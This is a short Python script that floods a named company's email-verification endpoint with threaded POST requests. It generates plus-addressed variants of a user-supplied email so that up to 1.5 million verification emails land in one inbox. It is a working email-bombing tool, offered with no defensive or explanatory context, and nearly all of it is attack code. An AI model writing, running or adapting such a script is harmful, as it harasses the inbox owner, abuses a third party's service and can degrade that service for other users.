import requests, json, urllib, threading, random
URL = "https://asset.nothing.tech/api/auth/verification/email/send"
headers = {
  'Content-Type': 'application/x-www-form-urlencoded',
}
mailID = input('Enter Email: ')
mailPrefix = mailID[:mailID.index('@')]
mailDomain = mailID[mailID.index('@'):]
# print(mailPrefix, mailDomain)
def spam(threadNum):
  sendCount = 0
  for i in range(100000):
    randomSuffix = random.randint(0,10000000000000000000000000000)
    genMail = urllib.parse.quote_plus(mailPrefix+'+'+str(randomSuffix)+mailDomain)
    payload = f"lang=in&is_agree=on&email={genMail}"
    r = requests.post(URL, data=(payload), headers=headers)
    sendCount += 1
    if(r.status_code == 200):
      print(f"Thread {threadNum} Sent")
    else:
      print('Error', r.json())

thread1 = threading.Thread(target=spam, args=(1,))
thread2 = threading.Thread(target=spam, args=(2,))
thread3 = threading.Thread(target=spam, args=(3,))
thread4 = threading.Thread(target=spam, args=(4,))
thread5 = threading.Thread(target=spam, args=(5,))
thread6 = threading.Thread(target=spam, args=(6,))
thread7 = threading.Thread(target=spam, args=(7,))
thread8 = threading.Thread(target=spam, args=(8,))
thread9 = threading.Thread(target=spam, args=(9,))
thread10 = threading.Thread(target=spam, args=(10,))
thread11 = threading.Thread(target=spam, args=(11,))
thread12 = threading.Thread(target=spam, args=(12,))
thread13 = threading.Thread(target=spam, args=(13,))
thread14 = threading.Thread(target=spam, args=(14,))
thread15 = threading.Thread(target=spam, args=(15,))
# thread16 = threading.Thread(target=spam)
# thread17 = threading.Thread(target=spam)
# thread18 = threading.Thread(target=spam)
# thread19 = threading.Thread(target=spam)
# thread20 = threading.Thread(target=spam)
# thread21 = threading.Thread(target=spam)
# thread22 = threading.Thread(target=spam)
# thread23 = threading.Thread(target=spam)
# thread24 = threading.Thread(target=spam)
# thread25 = threading.Thread(target=spam)
# thread26 = threading.Thread(target=spam)
# thread27 = threading.Thread(target=spam)
# thread28 = threading.Thread(target=spam)
# thread29 = threading.Thread(target=spam)
# thread30 = threading.Thread(target=spam)

thread1.start()
thread2.start()
thread3.start()
thread4.start()
thread5.start()
thread6.start()
thread7.start()
thread8.start()
thread9.start()
thread10.start()
thread11.start()
thread12.start()
thread13.start()
thread14.start()
thread15.start()
# thread16.start()
# thread17.start()
# thread18.start()
# thread19.start()
# thread20.start()
# thread21.start()
# thread22.start()
# thread23.start()
# thread24.start()
# thread25.start()
# thread26.start()
# thread27.start()
# thread28.start()
# thread29.start()
# thread30.start()